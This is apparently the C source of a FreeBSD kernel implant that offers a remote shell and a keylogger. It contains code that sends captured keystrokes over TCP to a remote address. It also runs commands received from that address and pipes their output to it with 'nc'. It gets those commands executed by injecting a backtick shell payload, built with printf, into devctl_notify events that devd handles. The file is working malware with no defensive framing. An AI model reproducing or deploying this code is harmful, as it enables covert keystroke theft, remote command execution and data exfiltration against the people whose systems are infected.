#include "config.h"
#include "shellproxy.h"
#include "keylog.h"
#include <netinet/in.h>
#include <sys/libkern.h>

#if defined(__has_include)
# if __has_include("dd_conf.h")
#  include "dd_conf.h"
# endif
#endif

#define CN_END "__CN9965f__"

#ifdef CFG_KEYLOGGER
static
void proxy_send_remote (const void* data, int len)
{
	struct socket* so = NULL;
	struct sockaddr_in sa;

	if (socreate(AF_INET, &so, SOCK_STREAM, IPPROTO_TCP,
	    curthread->td_ucred, curthread)!=0)
		return;
	proxy_attr_socket(so);

	memset(&sa, 0, sizeof(sa));
	sa.sin_len = sizeof(sa);
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = user_addr;
	sa.sin_port = htons(OUT_PORT);

	if (soconnect(so, (struct sockaddr*)&sa, curthread)==0) {
		int waited = 0;
		while (waited<50) {
			SOCK_LOCK(so);
			if (so->so_state&(SS_ISCONNECTED|SS_ISDISCONNECTED)) {
				int bad = !(so->so_state&SS_ISCONNECTED);
				SOCK_UNLOCK(so);
				if (bad)
					break;
				proxy_send_n(so, data, len);
				break;
			}
			SOCK_UNLOCK(so);
			tsleep(&so->so_timeo, PWAIT, "klconn", hz/20);
			waited++;
		}
	}
	soclose(so);
}
#endif

void proxy_execute (const char* cmd)
{
#ifdef CFG_KEYLOGGER
	if (strncmp(cmd, "@keylog", 7)==0) {
		char* buf = malloc(KEYLOG_RING_SIZE, M_TEMP, M_WAITOK);
		int n = keylog_dump(buf, KEYLOG_RING_SIZE);
		proxy_send_remote(buf, n);
		free(buf, M_TEMP);
		return;
	}
#endif
	// track user_addr 
	char ipbuf[16];
	struct in_addr ia;

	ia.s_addr = user_addr;

	inet_ntoa_r(ia, ipbuf);
	char full[1100];
	snprintf(full, sizeof(full), "%.*s 2>&1 | nc -w 2 %s %u", (int)strcspn(cmd, "\n"), cmd, ipbuf, OUT_PORT);

	char blob[1024];
	int n = 0;
	// holy fucking shit dude
	for (const char*p = full; *p != '\0' &&  n < (int)sizeof(blob)-5; p++)
		n += snprintf(blob+n, sizeof(blob)-n, "\\%03o", (unsigned char)*p);

	char payload[1400];
	snprintf(payload, sizeof(payload), "x}`printf${IFS}'%s'|sh`", blob);
#ifdef DBGMODEDONTUSEME
	printf("shellproxy: devctl in\\n");
#endif
	devctl_notify("IFNET", payload, "ATTACH", NULL);
#ifdef DBGMODEDONTUSEME
	printf("shellproxy: devctl out\\n");
#endif
}


static
int strip_end_marker (u8* buf, int len)
{
	int endlen = (int)sizeof(CN_END)-1;

	if (len<endlen || memcmp(buf+len-endlen, CN_END, endlen)!=0)
		return (len);
	return (len-endlen);
}

#ifdef DD_CONF_H
int proxy_execute_capture (struct remconn* rc, const char* cmd, u8* out, int outsz)
{
	char full[1100];
	char blob[1024];
	char payload[1400];
	u8* dgram;
	int n = 0;
	int got = 0;
	int truncated = 0;

	dgram = malloc(65536, M_TEMP, M_WAITOK);

	snprintf(full, sizeof(full), "( %.*s 2>&1; printf '%%s' '__CN9965f__' ) | " "nc -u -w 1 127.0.0.1 %u", (int)strcspn(cmd, "\n"), cmd, OUTPORT);

	for (const char*p = full; *p!='\0' && n<(int)sizeof(blob)-5; p++)
		n += snprintf(blob+n, sizeof(blob)-n, "\\%03o", (unsigned char)*p);

	snprintf(payload, sizeof(payload), "x}`printf${IFS}'%s'|sh`", blob);
	devctl_notify("IFNET", payload, "ATTACH", NULL);
	proxy_attr_start();

	rem_timeout(rc, 2);
	for (;;) {
		n = rem_recv_dgram(rc, dgram, 65536);
		if (n<=0)
			break;
		n = strip_end_marker(dgram, n);
		if (n<=0)
			break;
		// uhhh
		if (got + n > outsz) {
			n = outsz-got;
			truncated = 1;
		}
		if (n<=0)
			break;
		memcpy(out+got, dgram, n);
		got += n;
		if (got>=outsz) {
			truncated = 1;
			break;
		}
	}
	if (truncated) {
		// i fucking give up just truncate for now
		rem_timeout(rc, 1);
		while (rem_recv_dgram(rc, dgram, 65536)>0)
			;
	}
	free(dgram, M_TEMP);
	return (got);
}
#endif
